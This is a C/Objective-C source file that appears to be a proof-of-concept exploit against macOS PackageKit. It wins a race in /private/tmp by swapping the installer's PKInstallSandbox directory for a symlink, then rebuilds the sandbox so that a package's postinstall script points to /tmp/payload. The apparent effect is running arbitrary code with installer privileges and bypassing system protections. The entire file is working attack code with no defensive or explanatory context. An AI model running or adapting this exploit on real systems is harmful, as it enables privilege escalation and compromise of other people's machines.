#import <Foundation/Foundation.h>
#include <sys/stat.h>
#include <dirent.h>

void PackageKit_poc(void) {
    chdir("/private/tmp");
    DIR *dp;
    struct dirent *ep;
    char *sandbox, *pkgid;
    const char *fakebox = "/tmp/fakebox";
    mkdir(fakebox, 0777);
    char path[MAXPATHLEN] = {0};
    snprintf(path, MAXPATHLEN, "%s/Scripts", fakebox);
    while (1) {
        dp = opendir(".");
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 23) { //strlen("PKInstallSandbox.XXXXXX")==23
                sandbox = ep->d_name;
                rmdir(sandbox);
                symlink(fakebox, sandbox); // redirect Scripts(@rootless) to fakebox(fake sandbox)
                printf("Got sandbox:%s.\n", sandbox);
                goto NEXT;
            }
        }
        closedir (dp);
    }
NEXT:
    while (1) {
        dp = opendir(path); // Scripts directory inside the fakebox
        if (dp == NULL) continue; // Scripts may not copy yet, waiting.
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 31) { //strlen("com.apple.pkg.MXFPlugIns.XXXXXX")==31
                pkgid = ep->d_name;
                snprintf(path, MAXPATHLEN, "%s/tmp", fakebox);
                while (1) {
                    if (opendir(path)) break; // waiting for tmp directory copied.
                }
                unlink(sandbox);    // remove the symlink
                // mkdir -p sandbox/Scripts/pkgid
                mkdir(sandbox, 0777);
                snprintf(path, MAXPATHLEN, "%s/Scripts", sandbox);
                mkdir(path, 0777);
                snprintf(path, MAXPATHLEN, "%s/Scripts/%s", sandbox, pkgid);
                mkdir(path, 0777);
                snprintf(path, MAXPATHLEN, "%s/Scripts/%s/postinstall", sandbox, pkgid);
                symlink("/tmp/payload", path);
                
                // faster method to win the race: prepare the folders in advance, then link to sandbox
//                symlink("/tmp/fakebox/PKInstallSandbox", sandbox);
//                snprintf(path, MAXPATHLEN, "/tmp/fakebox/PKInstallSandbox/Scripts/%s", pkgid);
//                rename("/tmp/fakebox/PKInstallSandbox/Scripts/pkgid", path);
                
                printf("Got pkgid:%s.\n", pkgid);
                goto END;
            }
        }
        closedir (dp);
    }
END:
    printf("exploit successfully :D\n");
}

int main(int argc, const char * argv[]) {
    PackageKit_poc();
    return 0;
}

